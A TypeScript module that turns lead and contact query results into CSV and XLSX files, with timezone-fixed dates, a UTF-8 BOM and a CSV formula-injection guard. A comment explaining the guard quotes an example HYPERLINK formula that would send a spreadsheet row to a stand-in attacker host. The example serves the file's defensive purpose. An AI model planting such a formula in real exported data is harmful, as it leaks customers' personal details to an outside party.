// Turning query results into a file a salesperson can open.
//
// Pure serialisation: nothing here touches the database. The caller decides the
// shape of a row and which columns to emit, which keeps this module small,
// testable, and reusable by every export kind in /api/export.
import * as XLSX from 'xlsx';

export interface ExportColumn {
  /** Property to read off the row. */
  key: string;
  /** Header text. Must be unique within a column set — the xlsx writer keys
   *  its sheet rows by label, so a duplicate would silently drop a column. */
  label: string;
}

export type ExportRow = Record<string, unknown>;

export const CSV_MIME = 'text/csv; charset=utf-8';
export const XLSX_MIME =
  'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet';

/**
 * Excel does not sniff UTF-8 in a .csv — without a byte-order mark it falls
 * back to the machine's ANSI codepage, which mangles ₹ and every Devanagari
 * name in the contact book. The BOM is three bytes that make the file open
 * correctly for the people who actually use it.
 */
const BOM = '\uFEFF';

// The whole company runs on IST. Formatting through an explicit timezone means
// an export says the same thing whether it was produced on a laptop in Delhi or
// a container running in UTC.
const TIMEZONE = 'Asia/Kolkata';

const STAMP = new Intl.DateTimeFormat('en-GB', {
  timeZone: TIMEZONE,
  year: 'numeric',
  month: '2-digit',
  day: '2-digit',
  hour: '2-digit',
  minute: '2-digit',
  hourCycle: 'h23',
});

function partsOf(value: Date): Record<string, string> {
  const out: Record<string, string> = {};
  STAMP.formatToParts(value).forEach((part) => {
    out[part.type] = part.value;
  });
  return out;
}

/**
 * `YYYY-MM-DD HH:mm` in IST.
 *
 * Deliberately sortable rather than pretty: the cell is written as text, and
 * text in this layout sorts chronologically in Excel, Sheets and every CSV
 * viewer. Writing real date cells instead would re-open the timezone question
 * inside the spreadsheet, where we cannot answer it.
 */
export function formatDateTime(value: Date | string | null | undefined): string {
  if (value == null) return '';
  const date = value instanceof Date ? value : new Date(value);
  if (Number.isNaN(date.getTime())) return '';
  const p = partsOf(date);
  return `${p.year}-${p.month}-${p.day} ${p.hour}:${p.minute}`;
}

/** `YYYY-MM-DD` in IST — used for filenames. */
function today(): string {
  const p = partsOf(new Date());
  return `${p.year}-${p.month}-${p.day}`;
}

/**
 * `finbud-interested-leads-2026-07-28.csv`
 *
 * Dated, because these files end up in a shared drive and the second most
 * common support question is "which pull is this?".
 */
export function filenameFor(kind: string, ext: string): string {
  const slug =
    kind
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, '-')
      .replace(/^-+|-+$/g, '') || 'export';
  const suffix = ext.replace(/^\./, '').toLowerCase() || 'csv';
  return `finbud-${slug}-${today()}.${suffix}`;
}

// ---------------------------------------------------------------------------
// Cell normalisation
// ---------------------------------------------------------------------------

/**
 * Reduce an arbitrary row value to something a spreadsheet cell can hold.
 * Numbers stay numbers so Excel can sum a column of loan amounts; everything
 * else becomes text.
 */
function cellValue(value: unknown): string | number {
  if (value == null) return '';
  if (typeof value === 'number') return Number.isFinite(value) ? value : '';
  if (typeof value === 'boolean') return value ? 'Yes' : 'No';
  if (value instanceof Date) return formatDateTime(value);
  // A row that has already crossed a serialisation boundary carries its dates
  // as ISO strings; normalise those too so one export cannot end up with two
  // different date formats in the same column.
  if (typeof value === 'string' && /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}/.test(value)) {
    const parsed = formatDateTime(value);
    if (parsed) return parsed;
  }
  if (Array.isArray(value)) {
    return value
      .map((entry) => String(cellValue(entry)))
      .filter((entry) => entry !== '')
      .join('; ');
  }
  if (typeof value === 'object') {
    try {
      return JSON.stringify(value);
    } catch {
      return '';
    }
  }
  return String(value);
}

/**
 * Spreadsheet formula injection guard.
 *
 * Excel and Sheets evaluate any cell whose text begins with `=`, `+`, `-`, `@`
 * (or a leading tab/carriage return) as a formula. That is a real attack: a
 * contact imported with the name `=HYPERLINK("https://evil.example/"&A2)` would
 * exfiltrate the row the moment someone in sales opened the export. The common
 * *innocent* case is just as important — every Indian mobile number we store is
 * E.164, so `+919812345001` would otherwise be parsed as an expression and come
 * out as a number or an error.
 *
 * Prefixing with an apostrophe is the OWASP-recommended fix: it neutralises the
 * formula while leaving the value legible.
 */
function guardFormula(text: string): string {
  return /^[=+\-@\t\r]/.test(text) ? `'${text}` : text;
}

/** RFC 4180: quote when the field contains a comma, quote, CR or LF; double embedded quotes. */
function escapeCsv(text: string): string {
  if (!/[",\r\n]/.test(text)) return text;
  return `"${text.replace(/"/g, '""')}"`;
}

function csvField(value: unknown): string {
  const cell = cellValue(value);
  // A value we produced as a number cannot be a formula, and guarding it would
  // corrupt legitimate negatives (`-5000`), so only text is prefixed.
  if (typeof cell === 'number') return escapeCsv(String(cell));
  return escapeCsv(guardFormula(cell));
}

// ---------------------------------------------------------------------------
// Writers
// ---------------------------------------------------------------------------

/** RFC 4180 CSV, CRLF-terminated, with a UTF-8 BOM for Excel. */
export function toCsv(rows: ExportRow[], columns: ExportColumn[]): string {
  const lines: string[] = [columns.map((c) => escapeCsv(c.label)).join(',')];

  for (const row of rows) {
    lines.push(columns.map((c) => csvField(row[c.key])).join(','));
  }

  return BOM + lines.join('\r\n') + '\r\n';
}

/** Widths are sampled rather than measured across every row: 50,000 × 17 cells
 *  of string length is real work, and the first couple of hundred rows already
 *  tell us how wide "Customer intent" needs to be. */
const WIDTH_SAMPLE = 200;
const MIN_WIDTH = 10;
const MAX_WIDTH = 60;

function widthFor(column: ExportColumn, rows: ExportRow[]): number {
  let longest = column.label.length;
  const limit = Math.min(rows.length, WIDTH_SAMPLE);
  for (let i = 0; i < limit; i++) {
    const length = String(cellValue(rows[i][column.key])).length;
    if (length > longest) longest = length;
  }
  return Math.min(MAX_WIDTH, Math.max(MIN_WIDTH, longest + 2));
}

/**
 * A real .xlsx workbook.
 *
 * No formula guard here on purpose: SheetJS writes every string as a string
 * cell (`t: 's'`), never as a formula, so the injection vector that exists in
 * CSV simply does not exist in this format — and an apostrophe would show up
 * literally in the cell, in front of every phone number.
 */
export function toXlsx(rows: ExportRow[], columns: ExportColumn[]): Buffer {
  const labels = columns.map((c) => c.label);

  const data = rows.map((row) => {
    const record: Record<string, string | number> = {};
    for (const column of columns) record[column.label] = cellValue(row[column.key]);
    return record;
  });

  const sheet = XLSX.utils.json_to_sheet(data, { header: labels });
  sheet['!cols'] = columns.map((column) => ({ wch: widthFor(column, rows) }));

  const workbook = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(workbook, sheet, 'Export');

  return XLSX.write(workbook, { type: 'buffer', bookType: 'xlsx' }) as Buffer;
}
